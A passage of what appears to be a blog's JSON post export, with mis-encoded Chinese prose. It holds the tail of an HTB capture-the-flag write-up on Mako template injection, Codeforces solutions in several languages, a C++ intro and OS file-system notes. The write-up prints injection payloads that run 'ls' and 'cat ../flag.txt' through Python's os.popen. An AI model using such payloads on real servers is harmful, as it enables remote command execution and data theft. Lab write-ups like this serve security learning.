ï¼Œç„¶åç›´æ¥æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ³¨å…¥pythonä»£ç å³å¯ã€‚ é¦–å…ˆå°è¯• 1${__import__('os').popen('ls').read()} å…¶ä¸­ 1.popen('ls') ä¼šæ‰§è¡Œ ls å‘½ä»¤ï¼ˆé»˜è®¤æ˜¯å½“å‰å·¥ä½œç›®å½•ï¼‰ï¼Œè€Œ 1.read() ä¼šæŠŠå‘½ä»¤è¾“å‡ºè¯»å–æˆå­—ç¬¦ä¸²ã€‚ å¯ä»¥çœ‹åˆ° æ„å‘³ç€å½“å‰ç›®å½•ä¸‹æ²¡æœ‰flagã€‚æˆ‘ä»¬æ¥ç€æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•é‡Œçš„å†…å®¹ï¼š 1${__import__('os').popen('ls ..').read()} æˆåŠŸæ‰¾åˆ° flag.txt æ–‡ä»¶ã€‚æœ€åç›´æ¥è¯»å–å°±å¥½ï¼š 1${__import__('os').popen('cat ../flag.txt').read()} å¾—åˆ°flagï¼šHTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"æ¨¡æ¿æ³¨å…¥","slug":"æ¨¡æ¿æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"}]},{"title":"Codeforce Chat room","slug":"ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Chat-room","date":"2025-03-27T12:13:26.000Z","updated":"2025-04-02T11:06:00.595Z","comments":true,"path":"2025/03/27/ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Chat-room/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Chat-room/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯åˆ©ç”¨ä¸€ä¸ªindex/æŒ‡é’ˆæ¥é€ä¸ªåŒ¹é…ç›®æ ‡å­—ç¬¦ä¸² â€œhelloâ€ã€‚ä»j=0å¼€å§‹ï¼Œå¦‚æœæ‰¾åˆ°äº†jå°±åŠ ä¸€ã€‚å¦‚æœæœ€åj=5çš„è¯å°±è¯´æ˜æ‰¾åˆ°äº†ã€‚ ä»£ç C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string s; cin &gt;&gt; s; string target = \"hello\"; int j = 0; for (char c : s) { if (c == target[j]) { j++; } if (j == target.size()) { break; } } if (j == target.size()) { cout &lt;&lt; \"YES\" &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;}","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Lucky Division","slug":"ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Lucky-Division","date":"2025-03-27T12:06:28.000Z","updated":"2025-04-02T11:06:22.990Z","comments":true,"path":"2025/03/27/ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Lucky-Division/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Lucky-Division/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯å†™2ä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯ï¼ˆä¸¥æ ¼çš„ï¼‰lucky numberï¼Œç¬¬äºŒä¸ªå‡½æ•°éå†æ‰€æœ‰çš„lucky numberåˆ¤æ–­æ˜¯å¦æ˜¯å½“å‰nçš„å› æ•°ã€‚ ä»£ç C++12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// åˆ¤æ–­ä¸€ä¸ªæ•°å­—æ˜¯å¦æ˜¯ lucky numberï¼ˆåªå«æœ‰ 4 æˆ– 7ï¼‰bool is_lucky(int num) { string s = to_string(num); // æ¯”å¦‚è¯´ä¼šæŠŠ47è½¬æˆ\"47\" for (char c : s) { // ä¼šéå†stringä¸­çš„æ¯ä¸ªå­—æ¯ if (c != '4' &amp;&amp; c != '7') { return false; } } return true;}// åˆ¤æ–­æ˜¯å¦æ˜¯ almost lucky numberstring is_almost_lucky(int n) { for (int i = 1; i &lt;= n; ++i) { if (is_lucky(i) &amp;&amp; n % i == 0) { return \"YES\"; } } return \"NO\";}int main() { int n; cin &gt;&gt; n; cout &lt;&lt; is_almost_lucky(n) &lt;&lt; endl; return 0;} Python12345678910111213def is_lucky(num): # åˆ¤æ–­ä¸€ä¸ªæ•°å­—æ˜¯ä¸æ˜¯ lucky numberï¼ˆåªå« 4 æˆ– 7ï¼‰ return all(c in '47' for c in str(num))def is_almost_lucky(n): # æšä¸¾ 1 åˆ° n çš„æ‰€æœ‰ lucky number for i in range(1, n + 1): if is_lucky(i) and n % i == 0: return \"YES\" return \"NO\"n = int(input())print(is_almost_lucky(n))","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"C++ å…¥é—¨","slug":"ç¼–ç¨‹/Cpp-å…¥é—¨","date":"2025-03-26T21:47:10.000Z","updated":"2025-11-12T10:03:03.205Z","comments":true,"path":"2025/03/26/ç¼–ç¨‹/Cpp-å…¥é—¨/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%BC%96%E7%A8%8B/Cpp-%E5%85%A5%E9%97%A8/","excerpt":"","text":"Hello Worldè€è§„çŸ©è¿˜æ˜¯å…ˆè§è¯†ä¸€ä¸‹è¾“å‡ºâ€œHello World!â€ï¼š 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;Hello World!&quot;; return 0;&#125; æ³¨æ„å‡ ç‚¹ï¼š #include è¿™ä¸€éƒ¨åˆ†å’Œcæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åé¢çš„åº“çš„åå­—æ˜¯ä¸åŒçš„ï¼› using namespace std; æ˜¯ä¸ºäº†ä¸éœ€è¦åé¢æ¯æ¬¡ä½¿ç”¨åƒ cout æ—¶å¾—å†™å…¨æˆ std::cout ã€‚è€Œä¸”è®°å¾—ä¸€å®šè¦åœ¨åé¢åŠ ä¸Š ;ï¼› cout æ˜¯c outputï¼Œæƒ³è¾“å‡ºä»€ä¹ˆä¸œè¥¿éƒ½å¾—æŒ‰ç…§ cout","categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"}]},{"title":"Codeforce-String Task","slug":"ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-String-Task","date":"2025-03-26T13:02:00.000Z","updated":"2025-04-02T11:06:33.027Z","comments":true,"path":"2025/03/26/ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-String-Task/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-String-Task/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯ä»£ç Python1234567891011121314word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]# deletes all the vowelsword = ''.join(c for c in word if c.upper() not in V)# replaces all uppercase consonants with corresponding lowercase ones.word = word.lower()# inserts a character \".\" before each consonant,word = ''.join('.' + c for c in word)print(word) ä¼˜åŒ–ï¼š 12345word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]print(''.join('.' + c.lower() for c in word if c.upper() not in V)) C1 C++1","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Next Round","slug":"ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Next-Round","date":"2025-03-25T21:17:50.000Z","updated":"2025-04-02T11:05:31.486Z","comments":true,"path":"2025/03/25/ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Next-Round/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Next-Round/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯å…ˆç»Ÿè®¡å‰ k ä¸ªåˆ†æ•°ä¸­å¤§äº 0 çš„æ•°é‡ã€‚å› ä¸ºåˆ†æ•°æ˜¯é€’å‡æ’åˆ—çš„ï¼Œåªéœ€ç»§ç»­ç»Ÿè®¡ä»ç¬¬ k ä¸ªä½ç½®å¼€å§‹ï¼Œæ‰€æœ‰ä¸ç¬¬ k ä¸ªåˆ†æ•°ç›¸ç­‰çš„è¿ç»­åˆ†æ•°ä¸ªæ•°ã€‚æœ€åçš„æ€»åˆå°±æ˜¯ç»“æœã€‚ ä»£ç Python12345678910111213141516171819n_k = input().split()n = int(n_k[0])k = int(n_k[1])n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_list[:k] for i in range(k,n): if n_list[i] == comp: n1_list.append(n_list[i]) else: breakcount = sum(1 for x in n1_list if x &gt; 0)# print(n1_list)print(count) ä¼˜åŒ–ï¼š 1234n, k = map(int, input().split())scores = list(map(int, input().split()))threshold = scores[k - 1]print(sum(s &gt;= threshold and s &gt; 0 for s in scores)) ç”¨numpyçš„ï¼š 1234567import numpy as npn, k = map(int, input().split())scores = np.array(list(map(int, input().split())))threshold = scores[k - 1]result = np.sum((scores &gt;= threshold) &amp; (scores &gt; 0))print(result) C12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int main() { int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int scores[100]; // å‡è®¾æœ€å¤§ä¸è¶…è¿‡ 100 ä¸ªåˆ†æ•° for (int i = 0; i &lt; n; i++) { scanf(\"%d\", &amp;scores[i]); } int threshold = scores[k - 1]; // ç¬¬ k ä¸ªé€‰æ‰‹çš„åˆ†æ•°ï¼ˆç´¢å¼•ä» 0 å¼€å§‹ï¼‰ int count = 0; // å‰ k ä¸ªä¸­ç»Ÿè®¡ &gt;0 ä¸” &gt;= threshold çš„åˆ†æ•° for (int i = 0; i &lt; k; i++) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } // ä»ç¬¬ k ä¸ªå¼€å§‹ï¼Œç»Ÿè®¡è¿ç»­ç­‰äº threshold çš„ï¼ˆä¹Ÿå¿…é¡» &gt;0ï¼‰ for (int i = k; i &lt; n; i++) { if (scores[i] == threshold &amp;&amp; scores[i] &gt; 0) { count++; } else { break; } } printf(\"%d\\n\", count); return 0;} C++12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; scores[i]; } int threshold = scores[k - 1]; int count = 0; for (int i = 0; i &lt; n; ++i) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;} ç”¨rangesï¼š 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ranges&gt;using namespace std;namespace ranges = std::ranges;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int&amp; score : scores) { cin &gt;&gt; score; } int threshold = scores[k - 1]; auto advancers = scores | ranges::views::filter([threshold](int x) { return x &gt;= threshold &amp;&amp; x &gt; 0; }); cout &lt;&lt; ranges::distance(advancers) &lt;&lt; endl; return 0;} Remark1. å¦‚æœåªæ˜¯ 1n,k = input().split() çš„è¯åªä¼šå°†n,kèµ‹å€¼æˆ2ä¸ªstringï¼Œè€Œä¸æ˜¯intï¼Œæ‰€ä»¥éœ€è¦è¿™ä¸€æ­¥å°†å®ƒä»¬è½¬æˆ2ä¸ªintï¼š 123n_k = input().split()n = int(n_k[0])k = int(n_k[1]) listé‚£é‡Œçš„å¤„ç†ä¹Ÿæ˜¯åŒç†ã€‚ 2. å¦‚æœç›´æ¥å†™ 12345678n_list = list(map(int, input().split()))comp = n_list[k-1]for i in range(k,n): if n_list[i] == comp: n_list.append(n_list[i]) else: break çš„è¯ï¼Œä¼šå¯¼è‡´éå†ä¸€ä¸ªåˆ—è¡¨çš„åŒæ—¶åˆåœ¨ä¿®æ”¹å®ƒï¼Œä¼šå¯¼è‡´ç»“æœä¸å¯æ§ã€‚ ä½†å°±ç®—æ˜¯æ”¹æˆäº† 12345678910n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_listfor i in range(k,n): if n1_list[i] == comp: n_list.append(n1_list[i]) else: break ä¹Ÿä¸å¯¹ï¼Œå› ä¸ºåœ¨pythoné‡Œn1_list å¹¶ä¸æ˜¯ n_list çš„å¤åˆ¶å“ï¼Œè€Œåªæ˜¯åŒä¸€ä¸ªåˆ—è¡¨çš„ä¸¤ä¸ªåå­—ã€‚è¿™æ ·åªæ˜¯è®© n1_list å’Œ n_list æŒ‡å‘åŒä¸€ä¸ªåˆ—è¡¨å¯¹è±¡ï¼Œä¿®æ”¹ä»»ä½•ä¸€ä¸ªï¼Œéƒ½ä¼šå½±å“å¦ä¸€ä¸ªã€‚æ‰€ä»¥ä¼šå‡ºç°è·Ÿä¹‹å‰ä¸€æ¨¡ä¸€æ ·çš„ç»“æœã€‚ åˆ›å»ºç‹¬ç«‹çš„å‰¯æœ¬éœ€è¦ï¼š 123456n1_list = n_list[:]# æˆ–n1_list = list(n_list)# æˆ–import copyn1_list = copy.copy(n_list) ï¼ˆæ³¨æ„ï¼špythoné‡Œçš„list[a:b]æ˜¯å‰é—­åå¼€ï¼Œæ‰€ä»¥è¿™ä¸ªä¸åŒ…å«list[b]ï¼‰ 3. å‡å¦‚è¿™é“é¢˜çš„inputæ˜¯ä¹±åºçš„ï¼Œé‚£ä¹ˆéœ€è¦å…ˆå°†inputæ’åºäº†å†è¿›è¡Œåç»­æ“ä½œã€‚ pythonçš„è¯éå¸¸ç®€å•ï¼š 12345678910111213input = [3, 1, 4, 1, 5, 9]#å‡åºï¼šinput.sort() # åŸåœ°æ’åºï¼Œä¿®æ”¹ input æœ¬èº«# æˆ–è€…input = sorted(input) # è¿”å›æ–°æ’åºåçš„åˆ—è¡¨#é™åºï¼šinput.sort(reverse=True)# æˆ–è€…input = sorted(input, reverse=True) cå°±å¾ˆéº»çƒ¦äº†ï¼š 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int cmp(const void *a, const void *b) { return (*(int *)a - *(int *)b); // å‡åº // return (*(int *)b - *(int *)a); // é™åº}int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); qsort(arr, n, sizeof(int), cmp); // æ’åºè°ƒç”¨ for (int i = 0; i &lt; n; i++) { printf(\"%d \", arr[i]); } return 0;} å› ä¸º qsort()ï¼ˆé€šç”¨çš„æ’åºå‡½æ•°ï¼‰æ˜¯æ³›å‹å‡½æ•°ï¼Œå®ƒä¸èƒ½ç›´æ¥æ¯”è¾ƒ int æˆ– floatï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨å‘Šè¯‰å®ƒâ€œæ€ä¹ˆæ¯”è¾ƒä¸¤ä¸ªå€¼â€ã€‚ ç›¸æ¯”ä¹‹ä¸‹c++å°±ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œå› ä¸ºæœ‰å†…ç½®çš„å‡½æ•°ï¼š 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // é™åºä¼šéœ€è¦using namespace std;int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); sort(arr, arr + n); // é»˜è®¤å‡åºæ’åº // sort(arr, arr + n, greater&lt;int&gt;()); é™åº for (int i = 0; i &lt; n; i++) { cout &lt;&lt; arr[i] &lt;&lt; \" \"; } return 0;} ä¹Ÿå¯ä»¥ç›´æ¥ç”¨cppçš„ vector&lt;int&gt; 1234567891011121314151617#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main() { vector&lt;int&gt; v = {3, 1, 4, 1, 5, 9}; sort(v.begin(), v.end()); // å‡åº // sort(v.begin(), v.end(), greater&lt;int&gt;()); // é™åº for (int x : v) { cout &lt;&lt; x &lt;&lt; \" \"; } return 0;}","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce-Bit++","slug":"ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-04-02T11:05:16.379Z","comments":true,"path":"2025/03/25/ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Bit/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Bit/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯å¯¹äºæ¯ä¸€è¡Œå‘½ä»¤æ£€æµ‹+æ˜¯å¦åœ¨é‡Œé¢å°±å¥½ã€‚ ä»£ç Python123456789n = int(input())x=0for _ in range(n): op = input() if \"+\" in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n, x = 0; scanf(\"%d\", &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", op); if (strchr(op, '+')) { x += 1; } else { x -= 1; } } printf(\"%d\\n\", x); return 0;} C++","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Team","slug":"ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-04-02T11:05:46.927Z","comments":true,"path":"2025/03/25/ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-Team/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Team/","excerpt":"","text":"é¢˜ç›®æè¿° ä¸€å…±æœ‰ n é“é¢˜ç›®ï¼Œè€Œå¯¹äºæ¯é“é¢˜ï¼Œä»–ä»¬ä¼šé€‰æ‹©æ˜¯å¦å»åšè¿™é¢˜ï¼šåªæœ‰å½“ä¸‰ä¸ªäººä¸­è‡³å°‘æœ‰ä¸¤ä¸ªäººå¯¹è¿™é¢˜æœ‰æŠŠæ¡æ—¶ï¼Œä»–ä»¬æ‰ä¼šå†³å®šå»åšã€‚ æ€è·¯ç›´æ¥è®¡ç®—æ¯è¡Œçš„å’Œæ˜¯å¦å¤§äºç­‰äº2ã€‚ ä»£ç Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} C++123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main(){ int n; cin &gt;&gt; n; int a,b,c; int count=0; for( int i=0; i &lt; n; i++){ cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(a+b+c &gt;1){ count +=1; } } cout &lt;&lt; count; return 0;}","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Way Too Long Words é¢˜è§£","slug":"ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-04-02T11:04:46.144Z","comments":true,"path":"2025/03/25/ç®—æ³•ç«èµ›/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"é¢˜ç›®æè¿° ç®€å•æ¥è®²å°±æ˜¯éœ€è¦â€ç®€åŒ–â€œé•¿å•è¯ã€‚ æ€è·¯å…ˆåˆ¤æ–­å•è¯é•¿åº¦ã€‚å¦‚æœå°äºç­‰äº10å°±ä¸ç”¨ç®¡ï¼Œå¦‚æœè¶…è¿‡10ï¼Œåˆ™å†™æˆï¼šé¦–å­—æ¯ + ä¸­é—´çš„å­—æ¯æ•°é‡ + æœ«å°¾å­—æ¯ã€‚ ä»£ç Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} C++12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"GBS 7 Dateisystem æ–‡ä»¶ç³»ç»Ÿ","slug":"TUM info ç¬”è®°/GBS/GBS-7-Dateisystem-æ–‡ä»¶ç³»ç»Ÿ","date":"2025-03-24T20:53:38.000Z","updated":"2025-04-26T18:31:10.127Z","comments":true,"path":"2025/03/24/TUM info ç¬”è®°/GBS/GBS-7-Dateisystem-æ–‡ä»¶ç³»ç»Ÿ/","permalink":"https://archer-baiyi.github.io/2025/03/24/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"EinfÃ¼hrungé¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆæ˜ç¡®ä¸ºä»€ä¹ˆéœ€è¦æ–‡ä»¶ç³»ç»Ÿï¼š è¿›ç¨‹åœ¨è¿è¡ŒæœŸé—´åªèƒ½ä½¿ç”¨å…¶è™šæ‹Ÿåœ°å€ç©ºé—´æ¥å­˜å‚¨æ•°æ®ï¼šå®¹é‡æœ‰é™ã€‚ å½“è¿›ç¨‹ç»“æŸæ—¶ï¼Œå…¶è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„æ•°æ®ä¼šä¸¢å¤±ï¼šæ— æ³•å®ç°æŒä¹…çš„ã€é•¿æœŸçš„æ•°æ®å­˜å‚¨ã€‚ åœ¨è™šæ‹Ÿè¿›ç¨‹åœ°å€ç©ºé—´ä¸­å­˜å‚¨æ•°æ®åªå…è®¸æœ‰é™çš„å…±äº«è®¿é—®ï¼šä¸èƒ½å®ç°åŒæ—¶å¹¶è¡Œä½¿ç”¨ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ–‡ä»¶ç³»ç»Ÿæ¥æä¾›æ›´é«˜çº§åˆ«ï¼Œæ›´æŒä¹…ã€æ›´å¯é å¹¶ä¸”å¯å…±äº«çš„æ•°æ®å­˜å‚¨åŠŸèƒ½ã€‚ 